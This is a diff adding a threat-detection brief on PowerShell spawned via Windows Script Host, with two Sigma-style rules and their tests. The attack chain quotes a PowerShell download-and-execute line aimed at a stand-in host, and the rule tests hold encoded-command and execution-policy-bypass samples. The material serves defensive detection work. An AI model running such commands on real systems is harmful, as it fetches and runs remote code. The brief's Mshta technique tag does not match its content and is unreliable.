@@ -1,0 +1,112 @@
+id: brief-2024-01-03-winscript-powershell
+slug: 2024-01-winscript-powershell
+title: Suspicious PowerShell Execution via Windows Script Host
+summary: Detection of PowerShell execution with suspicious arguments initiated through Windows Script Host (wscript.exe or cscript.exe), often used for bypassing security controls.
+severity: high
+published_at: "2024-01-03T12:00:00Z"
+content: |
+    ## Overview
+
+    Attackers often use Windows Script Host (WSH), specifically `wscript.exe` and `cscript.exe`, to launch PowerShell with encoded commands or other suspicious arguments, bypassing traditional application control and command-line auditing. This technique allows for stealthy execution of malicious PowerShell scripts without directly invoking `powershell.exe` from the command line. Defenders should monitor for unusual parent-child process relationships where WSH processes spawn PowerShell with suspicious parameters. This activity is typically observed in post-exploitation scenarios or as part of initial access attempts where scripts are used to download and execute payloads. The scope of targeting is broad, affecting various Windows environments where script execution is enabled.
+
+    ## Attack Chain
+
+    1. Initial Access: An attacker gains initial access, potentially through phishing or exploitation of a vulnerability, resulting in the ability to execute code on the target system.
+    2. Script Execution: The attacker leverages `wscript.exe` or `cscript.exe` to execute a malicious script (e.g., VBScript, JScript) that is designed to launch PowerShell.
+    3. PowerShell Invocation: The script invokes `powershell.exe` with arguments like `-EncodedCommand`, `-enc`, or `-nop`, bypassing standard command-line auditing and security restrictions.
+    4. Command Obfuscation: The attacker employs Base64 encoding or other obfuscation techniques within the PowerShell command to conceal the true intent of the script.
+    5. Payload Download: The obfuscated PowerShell command downloads a malicious payload from an external server using `IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/payload.ps1')`.
+    6. Persistence: The downloaded payload establishes persistence through registry modifications or scheduled tasks, ensuring continued access to the system.
+    7. Lateral Movement: The attacker uses PowerShell to perform reconnaissance and lateral movement within the network, gathering credentials and identifying valuable targets.
+    8. Objective Achieved: The attacker achieves their objective, which may include data exfiltration, ransomware deployment, or espionage.
+
+    ## Impact
+
+    Successful exploitation can lead to complete system compromise, data theft, and ransomware deployment. The use of WSH as a launching point allows attackers to bypass traditional security controls and execute malicious PowerShell scripts with minimal detection. This can impact organizations of all sizes across various sectors, resulting in significant financial losses, reputational damage, and operational disruption. The lack of visibility into the executed PowerShell commands due to obfuscation techniques makes incident response and remediation more challenging.
+tags:
+    - powershell
+    - wscript
+    - cscript
+    - execution
+references:
+    - https://github.com/elastic/detection-rules/blob/main/rules/windows/execution_powershell_susp_args_via_winscript.toml
+rules:
+    - title: Detect PowerShell Launched via Wscript/Cscript with Encoded Command
+      description: Detects PowerShell being launched by wscript.exe or cscript.exe with encoded command parameters, which is often used for malicious purposes.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection_img and selection_cli and selection_powershell
+        selection_cli:
+            CommandLine|contains:
+                - -enc
+                - -EncodedCommand
+        selection_img:
+            - Image|endswith: \wscript.exe
+            - Image|endswith: \cscript.exe
+        selection_powershell:
+            CommandLine|contains: powershell.exe
+      level: high
+      tags:
+        - attack.execution
+        - attack.t1059.001
+      tests:
+        positive:
+            - name: Wscript launching powershell with encoded command
+              data:
+                - CommandLine: wscript.exe //E:jscript C:\Users\Public\evil.js powershell.exe -EncodedCommand blahblah
+                  Image: C:\Windows\System32\wscript.exe
+                  ParentImage: C:\Windows\explorer.exe
+        negative:
+            - name: Legitimate wscript execution
+              data:
+                - CommandLine: wscript.exe C:\legitimate\script.vbs
+                  Image: C:\Windows\System32\wscript.exe
+                  ParentImage: C:\Windows\explorer.exe
+    - title: Detect PowerShell Launched via Wscript/Cscript with Bypass Arguments
+      description: Detects PowerShell being launched by wscript.exe or cscript.exe with bypass arguments such as -ExecutionPolicy Bypass, indicating potential malicious activity.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection_img and selection_cli and selection_powershell
+        selection_cli:
+            CommandLine|contains:
+                - -ExecutionPolicy Bypass
+                - -ep bypass
+        selection_img:
+            - Image|endswith: \wscript.exe
+            - Image|endswith: \cscript.exe
+        selection_powershell:
+            CommandLine|contains: powershell.exe
+      level: medium
+      tags:
+        - attack.execution
+        - attack.t1059.001
+      tests:
+        positive:
+            - name: Cscript launching powershell with ExecutionPolicy Bypass
+              data:
+                - CommandLine: cscript.exe //NoLogo C:\Users\Public\evil.js powershell.exe -ExecutionPolicy Bypass -File C:\temp\evil.ps1
+                  Image: C:\Windows\System32\cscript.exe
+                  ParentImage: C:\Windows\explorer.exe
+        negative:
+            - name: Legitimate cscript execution
+              data:
+                - CommandLine: cscript.exe C:\legitimate\script.vbs
+                  Image: C:\Windows\System32\cscript.exe
+                  ParentImage: C:\Windows\explorer.exe
+ttps:
+    - tactic_id: TA0005
+      tactic_name: Defense Evasion
+      technique_id: T1218
+      technique_name: System Binary Proxy Execution
+      subtechnique_id: T1218.005
+      subtechnique_name: Mshta
+    - tactic_id: TA0002
+      tactic_name: Execution
+      technique_id: T1059
+      technique_name: Command and Scripting Interpreter
+      subtechnique_id: T1059.001
+      subtechnique_name: PowerShell
